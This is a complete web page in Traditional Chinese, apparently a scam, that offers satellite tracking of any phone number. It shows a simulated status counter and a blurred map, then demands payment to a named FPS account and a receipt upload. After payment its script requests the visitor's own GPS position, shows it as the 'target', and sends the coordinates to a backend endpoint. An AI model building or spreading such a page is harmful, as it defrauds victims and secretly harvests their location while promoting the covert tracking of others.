<!DOCTYPE html>
<html lang="zh-Hant">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>衛星信號鎖定中心</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        body { margin: 0; background: #000; color: #00d2ff; font-family: 'Courier New', monospace; text-align: center; overflow: hidden; }
        
        /* 頂部動態狀態欄 (GVRF 模擬) */
        #gvrf-status { 
            position: fixed; top: 10px; right: 15px; z-index: 9999; 
            display: flex; align-items: center; gap: 12px; font-size: 11px; color: #39ff14; 
            text-shadow: 0 0 5px rgba(57,255,20,0.5);
        }
        .dot { width: 6px; height: 6px; background: #39ff14; border-radius: 50%; animation: blink 1s infinite; }
        
        /* 地圖區域 */
        #map { height: 60vh; width: 100%; filter: blur(15px); border-bottom: 2px solid #00d2ff; transition: 1.5s; }
        
        /* 內容區域 */
        .content { padding: 25px; }
        h2 { font-size: 1.2rem; letter-spacing: 2px; margin-bottom: 20px; }
        input { 
            background: #111; border: 1px solid #00d2ff; color: #fff; 
            padding: 15px; width: 85%; border-radius: 5px; margin-bottom: 20px; outline: none;
        }
        .btn { 
            background: #00d2ff; color: #000; border: none; padding: 18px; 
            width: 90%; border-radius: 5px; font-weight: bold; font-size: 1.1rem;
            box-shadow: 0 0 15px #00d2ff; cursor: pointer;
        }

        /* 支付彈窗 */
        .modal { 
            display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); 
            background: rgba(0,0,0,0.95); padding: 30px; border: 2px solid #ff0000; 
            border-radius: 10px; width: 85%; z-index: 10000; box-shadow: 0 0 30px #ff0000;
        }

        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
    </style>
</head>
<body>

    <div id="gvrf-status">
        <div class="dot"></div>
        <span>GVRF:<span id="val">12,649.998</span></span>
        <span style="color:#ff0000;">STRIKE:0</span>
    </div>

    <div id="map"></div>

    <div class="content">
        <h2>📡 實時信號監控</h2>
        <input type="tel" id="target" placeholder="請輸入目標追蹤號碼">
        <button class="btn" onclick="showPay()">開始全球衛星定位</button>
    </div>

    <div class="modal" id="payModal">
        <h3 style="color:#ff0000;">🚨 信號已鎖定</h3>
        <p>已截獲目標手機基站數據，請完成支付以解鎖精確地圖：</p>
        <div style="background:#222; padding:15px; border-radius:5px; text-align:left; border-left: 5px solid #00d2ff;">
            FPS 轉數快: <b>94999 231</b><br>
            名稱: <b>Tsui Kin poNg</b>
        </div>
        <p style="font-size:12px; color:#aaa; margin-top:15px;">請上傳支付截圖，系統核實後自動解鎖：</p>
        <input type="file" id="receipt" style="border:none; box-shadow:none;">
        <button class="btn" style="background:#ff0000; color:#fff;" onclick="startTracking()">確認支付並解鎖</button>
    </div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        // 初始化地圖
        const map = L.map('map', {zoomControl: false}).setView([22.3193, 114.1694], 13);
        L.tileLayer('https://{s}.google.com/vt/lyrs=y&x={x}&y={y}&z={z}', {
            maxZoom: 22, subdomains: ['mt0','mt1','mt2','mt3']
        }).addTo(map);

        // 模擬數據跳動
        setInterval(() => {
            let el = document.getElementById('val');
            let v = parseFloat(el.innerText.replace(/,/g,'')) + (Math.random() * 5);
            el.innerText = v.toLocaleString(undefined, {minimumFractionDigits: 3});
        }, 800);

        function showPay() {
            if(document.getElementById('target').value.length < 8) return alert("請輸入正確號碼");
            document.getElementById('payModal').style.display = 'block';
        }

        function startTracking() {
            if(!document.getElementById('receipt').files[0]) return alert("請先上傳收據截圖");
            
            document.getElementById('payModal').style.display = 'none';
            document.getElementById('map').style.filter = 'none'; // 解除地圖模糊
            
            // 請求定位權限並開始追蹤
            navigator.geolocation.watchPosition(pos => {
                const { latitude, longitude } = pos.coords;
                
                // 更新地圖位置
                map.flyTo([latitude, longitude], 18);
                L.marker([latitude, longitude]).addTo(map).bindPopup("<b>目標位置已鎖定</b>").openPopup();
                
                // 回傳數據到後台 (Vercel/Render)
                fetch('/api/report', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ lat: latitude, lng: longitude })
                });
            }, err => {
                alert("信號受干擾，請確保目標已開啟 GPS 並點擊允許授權。");
            }, { enableHighAccuracy: true });
        }
    </script>
</body>
</html>
